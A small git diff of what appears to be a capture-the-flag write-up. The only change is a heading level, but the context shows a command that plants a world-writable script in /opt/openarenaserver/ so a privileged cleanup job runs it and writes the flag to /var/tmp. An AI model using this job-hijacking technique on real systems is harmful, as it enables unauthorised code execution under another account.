@@ -6,7 +6,7 @@
 - The script loop throught all files in /opt/openarenaserver/, exucute , and delete each one of them.
 - now its obvious i created a file , put getflag inside of it, and redirect the output to /var/tmp
 
-## command
+### command
 ```
 echo "getflag >> /var/tmp/flag" > /opt/openarenaserver/script.sh && chmod 777 /opt/openarenaserver/script.sh
 ```
